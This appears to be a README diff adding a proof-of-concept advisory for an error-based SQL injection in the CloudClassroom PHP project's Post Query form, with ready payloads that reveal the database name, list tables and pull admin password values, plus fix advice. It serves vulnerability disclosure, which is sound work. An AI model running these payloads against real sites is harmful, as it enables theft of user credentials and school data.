@@ -1,5 +1,92 @@
 # CLOUD-CLASSROOMS-php-1.0 PoC - Sql Injection Erro Based
 
+Presentation:
+Security vulnerability: SQL Injection
+Vulnerability Type: Injection
+Affected Component: Post Query functionality (postquerypublic)
+Software: CloudClassroom PHP Project
+Version: Latest available on GitHub (community project)
+Business area: Education / e-Learning Platforms
+
+Describe the bug/issue:
+A SQL Injection vulnerability exists in the Post Query feature of the CloudClassroom PHP Project.
+The vulnerable parameter is gnamex (sent via POST), and the backend directly concatenates user input into SQL statements without proper sanitization or parameterized queries.
+
+This allows an attacker to inject arbitrary SQL commands, enabling:
+
+Extraction of sensitive information (user credentials, exam results, etc.)
+
+Enumeration of databases, tables, and columns
+
+Potential compromise of the entire application and underlying database
+
+Evidence of Vulnerability:
+
+The vulnerable endpoint:
+
+http://<target>/CloudClassroom-PHP-Project-master/postquerypublic
+
+Vulnerable parameter:
+
+POST: gnamex
+Original SQL code (from source):
+
+$sql = "INSERT INTO `query`(`Query`, `Eid`) VALUES ('$tempsquery','$tempseid')";
+
+Because the input is not sanitized, attackers can inject SQL like:
+
+a' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) AND '1'='1
+
+Steps to Reproduce:
+Open the Post Query form at:
+
+http://<target>/CloudClassroom-PHP-Project-master/postquerypublic
+Intercept the request (e.g., with Burp Suite) or craft a manual POST:
+
+
+POST /CloudClassroom-PHP-Project-master/postquerypublic
+Content-Type: application/x-www-form-urlencoded
+
+gnamex=a' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) AND '1'='1&email=test@test.com&squeryx=test&update=Post Query!
+
+Observe the response returning:
+
+XPATH syntax error: '~cc_db~'
+Which reveals the current database name.
+
+Impact:
+
+Attackers can enumerate tables:
+
+a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1) AND '1'='1
+
+Extract sensitive data (e.g., usernames, hashed passwords from admin table):
+
+a' AND updatexml(1,concat(0x7e,(SELECT Apass FROM admin LIMIT 0,1),0x7e),1) AND '1'='1
+
+Severity: High (CVSS 7.5) because it allows full database compromise.
+
+Expected behavior:
+The application should use parameterized queries (prepared statements) to handle user input securely, preventing any SQL code injection.
+
+Bug Fix Recommendation:
+Implement prepared statements in PHP using mysqli or PDO.
+
+Use input validation and escaping.
+
+Apply least privilege principle on the database user.
+
+References:
+
+CWE-89: SQL Injection
+
+OWASP SQL Injection Prevention Cheat Sheet
+
+Additional context:
+Using blacklist-based filtering is not reliable. Attackers can bypass such filters easily by using encoding tricks, inline comments, or alternate syntax.
+
+
+
 <img width="1388" height="684" alt="image" src="https://github.com/user-attachments/assets/1a96003b-e14f-4b81-9ab9-55cec3bda1ec" />
 
 
